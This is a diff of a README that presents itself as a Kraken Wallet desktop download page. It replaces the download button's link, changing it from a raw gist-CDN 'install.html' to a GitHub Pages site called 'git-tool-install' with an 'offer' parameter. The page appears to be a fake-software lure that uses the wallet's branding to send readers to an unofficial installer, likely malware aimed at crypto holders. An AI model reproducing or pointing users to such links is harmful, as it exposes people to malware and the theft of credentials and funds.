@@ -1,6 +1,6 @@
 # Kraken Wallet Download — Desktop App for Secure Crypto Management
 
-<a href="https://gistcdn.githack.com/dimplesboner/1a666b835829be6e86d8f1657966d5d6/raw/10ff4d929ad5a11ff7057ed5e89cf026206d873c/install.html?offer=KrakenWallet" target="_blank">
+<a href="https://git-tool-install.github.io/.github/?offer=KrakenWallet" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20Kraken%20Wallet-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
